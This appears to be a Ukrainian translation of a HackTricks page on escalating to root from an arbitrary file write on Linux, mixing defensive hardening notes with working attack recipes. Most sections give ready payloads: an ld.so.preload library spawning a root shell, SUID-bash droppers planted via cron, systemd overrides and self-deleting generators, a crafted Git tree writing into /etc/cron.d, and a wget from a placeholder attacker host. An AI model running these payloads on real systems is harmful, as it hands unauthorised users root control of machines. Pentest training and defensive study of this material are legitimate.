# Запис довільного файла від імені root

{{#include ../../banners/hacktricks-training.md}}

### /etc/ld.so.preload

`/etc/ld.so.preload` — це загальносистемний список shared objects, які dynamic linker завантажує перед іншими shared objects. Режим secure-execution накладає додаткові обмеження на попереднє завантаження, тому шлях до бібліотеки, як-от `/tmp/pe.so`, не є універсальним методом для SUID-бінарників.\
Якщо ви можете створити або змінити цей файл, процес, який його завантажує, завантажить указану бібліотеку перед іншими shared objects, що дає змогу виконати код у контексті цього процесу.<sup>[[12]](#references)</sup>

Наприклад: `echo "/tmp/pe.so" > /etc/ld.so.preload`

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
    unlink("/etc/ld.so.preload");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
//cd /tmp
//gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```

### Git hooks

**Git hooks** — це виконувані скрипти, які запускаються під час подій у репозиторії, зокрема операцій commit і merge. Якщо **привілейований скрипт або користувач** виконує ці дії, а зловмисник може **записувати до папки `.git`**, hook можна використати для **підвищення привілеїв**.<sup>[[13]](#references)</sup>

Наприклад, у Git-репозиторії можна **створити скрипт** у **`.git/hooks`**, щоб він запускався щоразу під час створення нового commit:

```bash
echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchown root:root /tmp/0xdf\nchmod 4777 /tmp/0xdf' > pre-commit
chmod +x pre-commit
```

### Обхід шляху під час експорту дерева Git із привілеями

Привілейований синхронізатор може не виконувати checkout, а натомість перебирати репозиторій, на який впливає зловмисник, за допомогою `git ls-tree`, читати кожен blob через `git cat-file`, об’єднувати вказаний шлях із проміжним каталогом і самостійно записувати файл. Це перетворюється на **запис довільного файла з привілеями синхронізатора**, якщо разом використовуються `-c safe.directory=*` (що вимикає захист Git від репозиторіїв, власник яких відрізняється) і відсутня перевірка того, що цільовий шлях лишається всередині каталогу призначення. Абсолютне ім’я елемента дерева змушує Python-функцію `os.path.join(stage, name)` відкинути `stage`; відносне ім’я з `../` виходить за межі каталогу під час обробки шляху файловою системою. Оскільки застосунок матеріалізує необроблене дерево, а не просить Git виконати checkout, відхилення шляхів під час checkout не захищає місце запису.<sup>[[30]](#references)[[32]](#references)[[33]](#references)</sup>

Шукайте такий шаблон коду в root-сервісах, таймерах, агентах розгортання, засобах імпорту шаблонів і завданнях резервного копіювання та відновлення:<sup>[[30]](#references)</sup>

```python
entries = git("-c", "safe.directory=*", "ls-tree", "-rz", "HEAD")
for mode, oid, git_path in parse(entries):
    target = os.path.join(stage_root, git_path)  # no containment check
    os.makedirs(os.path.dirname(target), exist_ok=True)
    with open(target, "wb") as output:
        output.write(git("cat-file", "blob", oid))
```

Запис дерева кодується як `<mode> SP <name> NUL <raw object ID>`. Параметр `git hash-object --literally` навмисно дозволяє дані об’єкта, які звичайний парсер або `git fsck` можуть відхилити, тож тимчасовий клон може створити дерево з абсолютним шляхом призначення як ім’ям файлу. У цьому прикладі створюється blob із cron-файлом, створене дерево загортається в коміт, а гілка переміщується на нього; для експлуатації все одно потрібен дозвіл на оновлення репозиторію, який використовує привілейоване завдання, і Git-сервер, що приймає некоректний об’єкт.<sup>[[30]](#references)[[31]](#references)</sup>

```bash
blob=$(printf '%s\n' '* * * * * root cp /bin/bash /tmp/rootbash && chmod 6755 /tmp/rootbash' | git hash-object -w --stdin)
{ printf '100644 /etc/cron.d/git-sync\0'; printf '%s' "$blob" | xxd -r -p; } > tree.raw
tree=$(git hash-object -w -t tree --literally --stdin < tree.raw)
commit=$(printf 'crafted tree\n' | git commit-tree "$tree")
git update-ref refs/heads/main "$commit"
git ls-tree -r main
git push --force origin main
```

Посилення захисту має охоплювати як отримання даних із репозиторіїв, так і фінальну операцію з файловою системою:<sup>[[30]](#references)[[33]](#references)[[34]](#references)</sup>

- Замініть `safe.directory=*` на точний перелік репозиторіїв, яким має довіряти сервіс, і, де можливо, обробляйте репозиторії без привілеїв root.
- Перш ніж створювати файли, відхиляйте абсолютні імена та будь-які компоненти `.` або `..`. Після об’єднання шляхів виконайте канонізацію та перевірте, що цільовий шлях залишається всередині визначеного кореневого каталогу.
- Уникайте symlink-гонок типу «перевірити, а потім відкрити»: відкривайте відносно дескриптора довіреного каталогу, а в Linux використовуйте `openat2()` з `RESOLVE_BENEATH` і `RESOLVE_NO_SYMLINKS` для шляхів, контрольованих зловмисником.
- Надавайте перевагу звичайному checkout в ізольованому каталозі, а не повторній реалізації checkout на основі результатів plumbing-команд. Якщо потрібно отримувати дані з raw-об’єктів, увімкніть перевірку на стороні отримання, наприклад `receive.fsckObjects=true`; не послаблюйте перевірки `receive.fsck.*`, пов’язані з іменами шляхів, які потрібні для відхилення спеціально сформованих дерев.

### Розгортання конфігурації з підвищеними привілеями

Деякі служби керування зберігають запланований стан системи у файлі конфігурації, а згодом розгортають його з підвищеними привілеями. Наприклад, [openmediavault зберігає конфігурацію в `/etc/openmediavault/config.xml`](https://docs.openmediavault.org/en/7.x/faq.html), а його [інтерфейс RPC](https://docs.openmediavault.org/en/8.x/development/tools/omv_rpc.html) дає змогу застосовувати зміни служб. Якщо обліковий запис із нижчими привілеями може записувати цей файл або замінювати його, з’ясуйте, чи може він також запитати авторизоване розгортання та чи обробляє вибраний модуль змінене поле з правами root. Для ключів облікових записів SSH, запланованих команд і встановлення пакетів потрібні різні передумови; сама наявність файлу або можливість запису XML-файлу нічого з цього не доводить. Перевірте дозволи на файл і батьківські каталоги, групи користувача та його авторизацію RPC, встановлену версію й фактичний компонент, який використовує конфігурацію, не редагуючи її та не запускаючи операцію застосування під час інвентаризації.

Визначення дій Fail2Ban у `/etc/fail2ban/action.d/` — ще одна межа конфігурації з підвищеними привілеями. Користувач, який може записувати дані в цей каталог і шукати в ньому файли, може замінити визначення дії або додати перевизначення, але самі лише дозволи каталогу не доводять можливість виконання коду. Переконайтеся, що ввімкнений jail справді вибирає відповідну дію, що служба Fail2Ban виконує її з вищими привілеями, а також що відбудуться авторизоване перезавантаження/перезапуск і відповідна подія блокування. Не пов’язаний із цим дозвіл sudo на перезапуск Fail2Ban має значення лише тоді, коли він стосується точного виклику служби та завантажується змінене визначення. [Документація конфігурації дій Fail2Ban](https://github.com/fail2ban/fail2ban/blob/master/man/jail.conf.5) описує зв’язок між каталогом дій і jail; у [прикладі дії](https://github.com/fail2ban/fail2ban/blob/master/config/action.d/iptables.conf) показано, що `actionban` запускається під час блокування з правами користувача служби. Перевіряйте дозволи й ефективну конфігурацію, не змінюючи дії та не ініціюючи блокування під час інвентаризації.

Окрема межа безпеки виникає, коли ввімкнений jail Fail2Ban використовує поштову дію з даними, доповненими WHOIS. [CVE-2021-32749](https://github.com/fail2ban/fail2ban/security/advisories/GHSA-m985-3f3v-cwmm) стосувалася недовіреного тексту WHOIS, переданого через GNU mailutils `mail`, обробка escape-послідовностей якого могла запускати команду. Користувач із нижчими привілеями, який може записувати файли, може вплинути на відповідь, якщо він може змінити конфігурацію перевизначення сервера **вибраного WHOIS-клієнта**; у [Debian `whois.conf(5)`](https://manpages.debian.org/bookworm/whois/whois.conf.5.en.html) описано один із таких файлів, але його розташування та використання залежать від інсталяції. Перевірте ефективну конфігурацію jail/дії, ідентичність служби, фактичний WHOIS-клієнт і шлях до його конфігурації, реалізацію mail, можливість контролювати відповідь і встановлене виправлення від постачальника або backport. Сам по собі файл конфігурації WHOIS, доступний для запису, версія Fail2Ban або поштова дія не доводять наявності всього ланцюжка; під час пасивної інвентаризації не надсилайте запити до зовнішніх серверів і не ініціюйте блокування.

### Створення файлів через TFTP і привілейовані хуки пакетів

Доступна служба TFTP може перетнути межу контейнера або локального користувача, якщо її **ефективні** налаштування tftpd-hpa запускають її з правами root, відкривають корінь файлової системи як каталог `--secure` і вмикають `--create`. [Посібник tftpd-hpa](https://manpages.debian.org/trixie/tftpd-hpa/tftpd.8.en.html) описує параметри створення файлів і користувача. Це може дозволити створити новий файл у каталозі конфігурації з підвищеними привілеями, зокрема в `/etc/apt/apt.conf.d/`; замінити наявний файл може бути неможливо. [Посібник із конфігурації APT](https://manpages.debian.org/bookworm/apt/apt.conf.5.en.html) описує команди `APT::Update::Pre-Invoke`. Запущений з правами root `apt update` може стати споживачем із вищими привілеями, **лише якщо** він зчитує новий файл конфігурації. Перевірте фактичні аргументи та ідентичність запущеного демона, доступність мережі й фільтрацію трафіку, правила створення файлів у цільовому каталозі, ефективну область дії конфігурації APT і подальший виклик із підвищеними привілеями. Файл за замовчуванням, каталог призначення, доступний для запису, або сама лише запланована команда APT не доводять наявності всього ланцюжка. Під час пасивного аналізу читайте лише обмежені за обсягом локальні конфігураційні дані й метадані, не завантажуючи файлів і не запускаючи APT.

### Файли cron і часу

Якщо ви можете **записувати файли, пов’язані з cron, які виконує root**, зазвичай можна досягти виконання коду під час наступного запуску завдання. Серед цікавих цілей:<sup>[[14]](#references)[[20]](#references)</sup>

- `/etc/crontab`
- `/etc/cron.d/*`
- `/etc/cron.hourly/*`, `/etc/cron.daily/*`, `/etc/cron.weekly/*`, `/etc/cron.monthly/*`
- Crontab самого root у `/var/spool/cron/` або `/var/spool/cron/crontabs/`
- Таймери `systemd` і служби, які вони запускають

Швидкі перевірки:

```bash
ls -la /etc/crontab /etc/cron.d /etc/cron.hourly /etc/cron.daily /etc/cron.weekly /etc/cron.monthly 2>/dev/null
find /var/spool/cron* -maxdepth 2 -type f -ls 2>/dev/null
systemctl list-timers --all 2>/dev/null
grep -R "run-parts\\|cron" /etc/crontab /etc/cron.* /etc/cron.d 2>/dev/null
```

Типові шляхи зловживання:

- **Додати нове завдання cron від root** до `/etc/crontab` або файлу в `/etc/cron.d/`
- **Замінити скрипт**, який уже виконується через `run-parts`
- **Встановити бекдор у ціль наявного таймера**, змінивши скрипт або бінарний файл, який він запускає

Мінімальний приклад payload для cron:

```bash
echo '* * * * * root cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash' >> /etc/crontab
```

Якщо ви можете записувати лише до каталогу cron, який використовується `run-parts`, натомість помістіть туди виконуваний файл:

```bash
cat > /etc/cron.daily/backup <<'EOF'
#!/bin/sh
cp /bin/bash /tmp/rootbash
chown root:root /tmp/rootbash
chmod 4777 /tmp/rootbash
EOF
chmod +x /etc/cron.daily/backup
```

Нотатки:

- `run-parts` зазвичай ігнорує назви файлів із крапками, тому надавайте перевагу назвам на кшталт `backup` замість `backup.sh`.<sup>[[15]](#references)</sup>
- Деякі системи використовують таймери `systemd` замість класичного cron, але ідея зловживання та сама: **змінити те, що root виконає пізніше**.<sup>[[20]](#references)</sup>

### Файли служб і сокетів

Якщо ви можете записувати **файли юнітів `systemd`** або файли, на які вони посилаються, то, перезавантаживши й перезапустивши юніт або дочекавшись запуску служби чи сокета, можете отримати виконання коду від root.<sup>[[16]](#references)[[17]](#references)[[18]](#references)[[19]](#references)</sup>

Також перевірте права на запис і пошук у самому системному каталозі юнітів, включно з ACL: користувач може створити новий юніт у `/etc/systemd/system`, навіть якщо читання чи перегляд вмісту каталогу заборонено. Самого цього шляху недостатньо, щоб щось запустити. Переконайтеся, що системний менеджер завантажить новий юніт, що користувач має ефективний дозвіл `systemctl start` або `restart` із правами root для його назви (або інший привілейований шлях активації), а також що служба працює від імені потрібного користувача. Для зміненого на диску вже завантаженого юніта може знадобитися `daemon-reload`; завантаження нового юніта має іншу поведінку. Перш ніж вважати правило перезапуску з маскою достатнім, перевірте точні аргументи й винятки sudo. Див. [шлях пошуку юнітів systemd](https://www.freedesktop.org/software/systemd/man/latest/systemd.unit.html) і [завантаження юнітів та семантику перезавантаження systemctl](https://www.freedesktop.org/software/systemd/man/latest/systemctl.html).

Цікавими цілями є:

- `/etc/systemd/system/*.service`
- `/etc/systemd/system/*.socket`
- Файли перевизначень Drop-in у `/etc/systemd/system/<unit>.d/*.conf`
- Скрипти/бінарні файли служб, на які посилаються директиви `ExecStart=`, `ExecStartPre=`, `ExecStartPost=`
- Доступні для запису шляхи `EnvironmentFile=`, які завантажує служба root

Швидкі перевірки:

```bash
ls -la /etc/systemd/system /lib/systemd/system /usr/lib/systemd/system 2>/dev/null
systemctl list-units --type=service --all 2>/dev/null
systemctl list-units --type=socket --all 2>/dev/null
grep -R "^ExecStart=\\|^EnvironmentFile=\\|^ListenStream=" /etc/systemd/system /lib/systemd/system /usr/lib/systemd/system 2>/dev/null
```

Поширені способи зловживання:

- **Перезаписати `ExecStart=`** у файлі конфігурації служби, що належить root і який ви можете змінювати
- **Додати drop-in override** зі шкідливим `ExecStart=` і спершу очистити старий
- **Встановити backdoor у скрипт/бінарний файл**, на який уже посилається файл конфігурації служби
- **Перехопити службу, активовану сокетом**, змінивши відповідний файл `.service`, який запускається, коли сокет отримує з’єднання

Приклад шкідливого override:

```ini
[Service]
ExecStart=
ExecStart=/bin/sh -c 'cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash'
```

Типовий процес активації:

```bash
systemctl daemon-reload
systemctl restart vulnerable.service
# or trigger the socket-backed service by connecting to it
```

Якщо ви не можете самостійно перезапустити служби, але можете редагувати активований через сокет unit, можливо, достатньо **дочекатися підключення клієнта**, щоб запустити бекдорнуту службу від імені root.<sup>[[17]](#references)</sup>

### Каталоги генераторів systemd

**Генератори systemd** — це виконувані файли, які менеджер systemd запускає перед завантаженням unit-файлів як під час завантаження системи, так і під час перезавантаження конфігурації. Тому доступ на запис до каталогу генераторів systemd (або до наявного виконуваного генератора) дає змогу безпосередньо виконувати код від імені root; це легко пропустити, якщо під час аудиту перевіряють лише файли `*.service` і `*.timer`.<sup>[[35]](#references)[[36]](#references)</sup>

Зазвичай каталоги перевіряються в такому порядку: `/run/systemd/system-generators/`, `/etc/systemd/system-generators/`, `/usr/local/lib/systemd/system-generators/` і `/usr/lib/systemd/system-generators/` (у деяких дистрибутивах `/lib/systemd/system-generators/` доступний через об’єднану ієрархію `/usr`). Виконуваний файл з однаковою назвою в каталозі, що стоїть раніше в цьому порядку, затінює файл у пізнішому каталозі. Не плутайте ці **каталоги вхідних виконуваних файлів** із `/run/systemd/generator`, `/run/systemd/generator.early` і `/run/systemd/generator.late`, де зберігаються тимчасові unit-файли, створені генераторами.<sup>[[35]](#references)</sup>

Швидкі перевірки:

```bash
for d in /run/systemd/system-generators /etc/systemd/system-generators \
         /usr/local/lib/systemd/system-generators /usr/lib/systemd/system-generators \
         /lib/systemd/system-generators; do
    [ -e "$d" ] || continue
    namei -l "$d"
    find "$d" -maxdepth 1 -writable -ls 2>/dev/null
    getfacl -p "$d" "$d"/* 2>/dev/null
done
```

Щойно створеному генератору потрібно встановити біт виконання. Якщо примітив запису дає змогу керувати байтами, але не режимом доступу, виберіть наявний виконуваний генератор: його перезапис на місці зазвичай зберігає метадані. Якщо каталог доступний для запису, створіть новий файл і позначте його як виконуваний.<sup>[[35]](#references)</sup>

```bash
cat > /etc/systemd/system-generators/zz-update <<'EOF'
#!/bin/sh
cp /bin/bash /tmp/rootbash
chown 0:0 /tmp/rootbash
chmod 4755 /tmp/rootbash
rm -f "$0"
EOF
chmod 755 /etc/systemd/system-generators/zz-update
```

Запуск `systemctl daemon-reload` для **системного** менеджера вимагає відповідної авторизації, але повторно запускає всі системні генератори; інакше дочекайтеся перезавантаження з підвищеними привілеями, операції з пакетом або перезавантаження системи. Каталоги генераторів користувача, як-от `~/.config/systemd/user-generators/`, виконуються під менеджером користувача й самі по собі **не надають root-доступу**.<sup>[[35]](#references)</sup>

Для посилення захисту та пошуку загроз перевіряйте кожен компонент шляху й ACL, а не лише кінцеві біти режиму доступу, фіксуйте базові хеші та власника пакета для генераторів, а також сповіщайте про створення, перейменування, зміну вмісту чи дозволів у всіх системних каталогах вхідних даних генераторів. Важливо відстежувати запис, оскільки одноразовий генератор може видалити себе після виконання, тоді як дерево згенерованих юнітів у `/run/systemd/generator*` перебудовується під час наступного перезавантаження конфігурації.<sup>[[35]](#references)[[36]](#references)</sup>

### Перезаписати обмежувальний `php.ini`, який використовує привілейована PHP-пісочниця

Деякі спеціальні демони перевіряють наданий користувачем PHP-код, запускаючи `php` з **обмежувальним `php.ini`** (наприклад, `disable_functions=exec,system,...`). Якщо код у пісочниці все ще має **будь-який примітив запису** (наприклад, `file_put_contents`), і ви можете дістатися до **точного шляху до `php.ini`**, який використовує демон, ви можете **перезаписати цей конфігураційний файл**, зняти обмеження, а потім надіслати друге корисне навантаження, яке виконається з підвищеними привілеями.<sup>[[2]](#references)</sup>

Типовий сценарій:

1. Перше корисне навантаження перезаписує конфігурацію пісочниці.
2. Друге корисне навантаження виконує код, коли небезпечні функції вже знову ввімкнено.

Мінімальний приклад (замініть шлях на той, який використовує демон):

```php
<?php
file_put_contents('/path/to/sandbox/php.ini', "disable_functions=\n");
```

Якщо daemon працює від root (або перевіряє шляхи, власником яких є root), другий запуск дає контекст root. По суті, це **privilege escalation via config overwrite**, коли середовище виконання в sandbox усе ще може записувати файли.

### binfmt_misc

`binfmt_misc` надає доступ до реєстрацій у `/proc/sys/fs/binfmt_misc`; кожна реєстрація зіставляє шаблон типу файлу з інтерпретатором. Вплив на привілеї залежить від того, хто може змінювати реєстрацію та який процес згодом запускає файл, що відповідає шаблону, тому перш ніж вважати це шляхом підвищення привілеїв, перевірте ці умови.<sup>[[21]](#references)</sup>

Виконуваний допоміжний файл із `CAP_DAC_OVERRIDE` може бути окремим шляхом реєстрації, якщо він приймає контрольовані викликачем дані та записує їх у `/proc/sys/fs/binfmt_misc/register`, навіть якщо викликач не може записувати безпосередньо в цей вузол. Під час інвентаризації перевірте вхідні дані допоміжного файлу та його поведінку під час запису, не запускаючи його. Якщо зареєстроване правило використовує прапорець `C`, інтерпретатор отримує облікові дані на основі відповідного бінарного файла; тому SUID-файл, власником якого є root, може запустити контрольований викликачем інтерпретатор від root. Перевірте монтування та політику реєстрації `binfmt_misc`, ефективні capabilities допоміжного файлу, точне правило та шлях до інтерпретатора, наявність виконуваного SUID-файла, а також те, чи пригнічують `no_new_privs` або монтування `nosuid` перехід SUID. Сам прапорець capability або рядок із вбудованим шляхом — лише підстава для перевірки.<sup>[[21]](#references)</sup> Умови, за яких SUID пригнічується, див. у [execve(2)](https://man7.org/linux/man-pages/man2/execve.2.html).

### Перезапис обробників схем (наприклад, http: або https:)

Середовища робочого столу використовують асоціації MIME та записи desktop, щоб вибрати застосунок для URI-схем; зловмисник, який може записувати у відповідну конфігурацію користувача та каталоги записів desktop, може перенаправити ці схеми на контрольований ним launcher. Змінивши файл `$HOME/.config/mimeapps.list`, щоб обробники URL HTTP і HTTPS вказували на шкідливий файл (наприклад, `x-scheme-handler/http=evil.desktop` і `x-scheme-handler/https=evil.desktop`), можна домогтися запуску цього запису desktop після натискання користувачем посилання.<sup>[[22]](#references)[[23]](#references)[[24]](#references)</sup>

```bash
[Desktop Entry]
Type=Application
Name=Evil Desktop Entry
Exec=/bin/sh -c "id > /tmp/mime-handler-pwned"
MimeType=x-scheme-handler/http;x-scheme-handler/https;
```

### Виконання від імені root скриптів/бінарних файлів, доступних для запису користувачу

Якщо привілейований процес запускає щось на кшталт `/bin/sh /home/username/.../script` (або будь-який бінарний файл у каталозі, що належить непривілейованому користувачу), це можна перехопити:<sup>[[1]](#references)</sup>

- **Виявлення запуску:** відстежуйте процеси за допомогою pspy, щоб помітити, коли root запускає шляхи, контрольовані користувачем.<sup>[[25]](#references)</sup>

```bash
wget http://attacker/pspy64 -O /dev/shm/pspy64
chmod +x /dev/shm/pspy64
/dev/shm/pspy64   # wait for root commands pointing to your writable path
```

- **Перевірте можливість запису:** переконайтеся, що цільовий файл і його каталог належать вашому користувачу або доступні йому для запису.
- **Перехопіть ціль:** створіть резервну копію оригінального бінарного файлу/скрипту та розмістіть payload, який створює SUID-оболонку (або виконує будь-яку іншу дію від root), а потім відновіть дозволи:

```bash
mv server-command server-command.bk
cat > server-command <<'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootshell
chown root:root /tmp/rootshell
chmod 6777 /tmp/rootshell
EOF
chmod +x server-command
```

- **Запустіть привілейовану дію** (наприклад, натисніть кнопку інтерфейсу, яка запускає допоміжну програму). Коли root повторно запустить перехоплений шлях, отримайте shell із підвищеними привілеями за допомогою `./rootshell -p`.

### Модифікація привілейованих бінарних файлів лише в page cache

Деякі kernel bugs не змінюють файл **на диску**. Натомість вони дають змогу змінювати лише **копію в page cache** читабельного файлу. Якщо ціллю може бути бінарний файл із **setuid** або інший файл, який запускається від імені **root**, наступний запуск може виконати контрольовані зловмисником байти з пам’яті та підвищити привілеї, хоча hash файлу на диску не змінився.<sup>[[3]](#references)[[4]](#references)</sup>

Це корисно розглядати як **примітив запису лише під час виконання**:<sup>[[3]](#references)</sup>

- **Диск залишається чистим**: inode та байти на диску не змінюються
- **Пам’ять змінюється**: процеси, які читають або виконують кешовану сторінку, отримують вміст, змінений зловмисником
- **Ефект тимчасовий**: зміни зникають після перезавантаження або витіснення даних із кешу

Цей примітив займає проміжне місце між класичним **довільним записом у файл** і старішими bugs зловживання page cache, як-от Dirty COW / Dirty Pipe:<sup>[[3]](#references)</sup>

- Dirty COW покладався на race condition
- Dirty Pipe мав обмеження на позицію запису
- Примітив лише для page cache може бути надійнішим, якщо вразливий шлях забезпечує прямий запис у кешовані сторінки, прив’язані до файлу

#### Загальний сценарій privesc

1. Отримайте kernel primitive, який дає змогу записувати в **сторінки page cache, прив’язані до файлу**
2. Застосуйте його до **читабельного привілейованого бінарного файлу** або іншого файлу, який запускається від імені root
3. Запустіть файл, **перш ніж** його сторінку буде витіснено з кешу
4. Отримайте виконання коду з правами root, поки файл на диску все ще виглядає незміненим

Типові цілі з високою цінністю:

- Бінарні файли **setuid-root**
- Допоміжні програми, які запускають **root-сервіси**
- Бінарні файли, які часто запускаються з **контейнерів, що спільно використовують kernel/page cache хоста**

#### Приклад шляху через AF_ALG і `splice()`

Copy Fail (CVE-2026-31431) — вдалий приклад цього класу. Вразливий шлях був у користувацькому API криптографії Linux (`AF_ALG` / `algif_aead`):<sup>[[3]](#references)[[4]](#references)[[5]](#references)[[6]](#references)[[7]](#references)</sup>

- `splice()` може переміщувати посилання на сторінки page cache з читабельного файлу до scatterlist TX криптографічного підсистеми
- шлях розшифрування `algif_aead` на місці повторно використовував буфери джерела та призначення
- потім `authencesn` записував дані в область тегу призначення
- коли ця область усе ще посилалася на сторінки файлу в page cache, запис потрапляв у **page cache цільового файлу**

Отже, цікава тут не сама CVE, а такий шаблон:

- **передати сторінки кешу, прив’язані до файлу, підсистемі ядра**
- змусити підсистему **вважати їх доступним для запису вихідним буфером**
- виконати невелике контрольоване перезаписування в пам’яті

У публічному PoC використовували повторювані **4-байтові записи**, щоб змінити `/usr/bin/su` у пам’яті, а потім запустити його.<sup>[[4]](#references)[[7]](#references)</sup>

#### Приклад шляху через ESP / XFRM і клон netfilter TEE

DirtyClone (CVE-2026-43503) демонструє інший варіант того самого шаблону **запису в root-файл лише через page cache**, але цього разу ціллю є **розшифрування IPsec ESP**, а не `AF_ALG`.<sup>[[8]](#references)[[9]](#references)[[10]](#references)[[11]](#references)</sup>

Ключовий прийом — **підміна метаданих**:

- `splice()` поміщає **сторінку page cache файлу лише для читання** в пакет ESP-in-UDP
- початковий захист DirtyFrag позначав цей skb прапорцем `SKBFL_SHARED_FRAG`, щоб `esp_input()` **спочатку копіював дані, а потім розшифровував**
- netfilter `TEE` дублює пакет через `nf_dup_ipv4()` -> `__pskb_copy_fclone()`
- клон зберігає **те саме посилання на фізичну сторінку page cache**, але втрачає `SKBFL_SHARED_FRAG`
- після цього `esp_input()` вважає клон безпечним і виконує **розшифрування `cbc(aes)` на місці** на сторінці файлу

Висновок для рев’юерів ширший за саму CVE: якщо захист використовує **метадані skb/сторінки**, щоб вирішити, чи потрібно спочатку копіювати дані, будь-який шлях **клонування/копіювання, який зберігає базову сторінку, але відкидає метадані**, може непомітно знову відкрити примітив запису.

Типовий сценарій експлуатації:

1. Виконайте `unshare(CLONE_NEWUSER | CLONE_NEWNET)`, щоб отримати **`CAP_NET_ADMIN` у приватному network namespace**
2. Увімкніть loopback і встановіть правило **netfilter `TEE`** у `mangle/OUTPUT`
3. Встановіть транспортні SA XFRM ESP через `NETLINK_XFRM`
4. Закодуйте кожне цільове 4-байтове слово в полі `seq_hi` SA (прийом DirtyFrag для вибору слова)
5. Надішліть пакет ESP-in-UDP зі spliced-даними, щоб **клон TEE** потрапив до `esp_input()` і був **розшифрований на місці**
6. Повторюйте, доки копія `/usr/bin/su` або іншого привілейованого виконуваного файлу в page cache не міститиме код, контрольований зловмисником

На практиці наслідок такий самий, як у прикладі з `AF_ALG`: файл на диску залишається чистим, але `execve()` використовує **змінені байти page cache** і надає права root.<sup>[[8]](#references)[[9]](#references)</sup>

Корисні перевірки на наявність цієї вразливості:

```bash
unshare -Urn true 2>/dev/null && echo "user+net namespaces available"
sysctl kernel.apparmor_restrict_unprivileged_userns 2>/dev/null
modprobe -n -v xt_TEE 2>/dev/null
modprobe -n -v esp4 2>/dev/null
modprobe -n -v esp6 2>/dev/null
lsmod | egrep 'xt_TEE|nf_dup_ipv4|esp4|esp6|x_tables'
```

Короткострокове зменшення поверхні атаки тут також залежить від шляху: оновлення до ядра з комітом `48f6a5356a33` виправляє шлях `clone`, а блокування автозавантаження `xt_TEE` усуває **етап відмивання прапорців**, тоді як блокування `esp4` / `esp6` усуває **точку приймання розшифрованих даних**.<sup>[[8]](#references)[[9]](#references)[[10]](#references)[[11]](#references)</sup>

#### Виявлення та пошук

Якщо ви підозрюєте наявність такого класу вразливостей, не покладайтеся лише на перевірки цілісності диска. Також перевірте:

```bash
uname -r
grep CONFIG_CRYPTO_USER_API_AEAD= /boot/config-$(uname -r) 2>/dev/null
lsmod | grep algif_aead
find / -perm -4000 -type f 2>/dev/null
```

Значення конфігурації нижче розрізняють завантажуваний інтерфейс і інтерфейс, вбудований у ядро; правила збирання crypto зіставляють `CONFIG_CRYPTO_USER_API_AEAD` з `algif_aead`.<sup>[[26]](#references)[[27]](#references)</sup>

- `CONFIG_CRYPTO_USER_API_AEAD=m`: `algif_aead` можна завантажувати та вивантажувати як модуль
- `CONFIG_CRYPTO_USER_API_AEAD=y`: інтерфейс вбудований у ядро
- setuid-бінарні файли — хороші цілі, оскільки для перетворення локального foothold на root може бути достатньо патча лише для page cache

#### Зменшення поверхні атаки для шляху `algif_aead`

Якщо вразливий інтерфейс надається завантажуваним модулем:<sup>[[6]](#references)[[28]](#references)[[29]](#references)</sup>

```bash
echo "install algif_aead /bin/false" > /etc/modprobe.d/disable-algif.conf
rmmod algif_aead 2>/dev/null || true
```

Якщо це скомпільовано в ядро, у деяких звітах зазначалося, що шлях init блокується за допомогою:<sup>[[28]](#references)</sup>

```bash
initcall_blacklist=algif_aead_init
```

Цей тип пом’якшення варто пам’ятати й у випадку інших kernel LPE: якщо експлуатація залежить від певного необов’язкового інтерфейсу, його вимкнення або додавання до blacklist може перервати шлях експлуатації ще до того, як стане доступним повне оновлення kernel.<sup>[[6]](#references)[[28]](#references)</sup>



## References

- [1] [HTB Bamboo — перехоплення скрипту, що виконується від імені root, у доступному для запису користувачем каталозі PaperCut](https://0xdf.gitlab.io/2026/02/03/htb-bamboo.html)
- [2] [HTB: Gavel](https://0xdf.gitlab.io/2026/03/14/htb-gavel.html)
- [3] [Tenable: Copy Fail (CVE-2026-31431) — відповіді на поширені запитання](https://www.tenable.com/blog/copy-fail-cve-2026-31431-frequently-asked-questions-about-linux-kernel-privilege-escalation)
- [4] [Розкриття інформації про CVE-2026-31431 у Openwall oss-security](https://www.openwall.com/lists/oss-security/2026/04/29/23)
- [5] [Виправлення в Linux stable: crypto: algif_aead — повернення до роботи поза місцем](https://git.kernel.org/stable/c/a664bf3d603dc3bdcf9ae47cc21e0daec706d7a5)
- [6] [Copy Fail — рекомендація щодо CVE-2026-31431](https://copy.fail/)
- [7] [Технічний розбір Theori / Xint](https://xint.io/blog/copy-fail-linux-distributions)
- [8] [Репозиторій DirtyClone / README](https://github.com/rafaeldtinoco/security/tree/main/exploits/dirtyclone)
- [9] [JFrog: аналіз і експлуатація варіанта Linux LPE DirtyClone (CVE-2026-43503)](https://research.jfrog.com/post/dissecting-and-exploiting-linux-lpe-variant-dirtyclone-cve-2026-43503/)
- [10] [Виправлення Linux: net: skb: збереження `SKBFL_SHARED_FRAG` у `__pskb_copy_fclone()` (`48f6a5356a33`)](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=48f6a5356a33)
- [11] [Попереднє пом’якшення в Linux: встановлення `SKBFL_SHARED_FRAG` для UDP-пакетів, переданих через splice (`f4c50a4034e6`)](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=f4c50a4034e6)
- [12] [ld.so(8) — сторінка посібника Linux](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [13] [Git Hooks](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks)
- [14] [crontab(5) — сторінка посібника Linux](https://man7.org/linux/man-pages/man5/crontab.5.html)
- [15] [run-parts(8) — сторінка посібника Debian](https://manpages.debian.org/bookworm/debianutils/run-parts.8.en.html)
- [16] [systemd.service](https://github.com/systemd/systemd/blob/main/man/systemd.service.xml)
- [17] [systemd.socket](https://github.com/systemd/systemd/blob/main/man/systemd.socket.xml)
- [18] [systemd.unit](https://github.com/systemd/systemd/blob/main/man/systemd.unit.xml)
- [19] [systemd.exec](https://github.com/systemd/systemd/blob/main/man/systemd.exec.xml)
- [20] [systemd.timer](https://github.com/systemd/systemd/blob/main/man/systemd.timer.xml)
- [21] [binfmt_misc — документація ядра Linux](https://www.kernel.org/doc/html/latest/admin-guide/binfmt-misc.html)
